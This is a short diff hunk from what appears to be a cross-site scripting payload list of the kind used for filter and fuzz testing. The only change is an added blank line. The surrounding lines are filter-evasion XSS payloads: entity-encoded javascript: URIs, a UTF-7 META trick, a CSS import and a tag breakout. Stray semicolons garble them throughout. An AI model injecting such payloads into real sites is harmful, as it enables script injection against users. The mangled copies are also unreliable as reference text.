@@ -1277,6 +1277,7 @@ a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";
 <;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
 <;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-
 \";;alert(';XSS';);//
+ 
 <;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
 <;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
 <;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>;
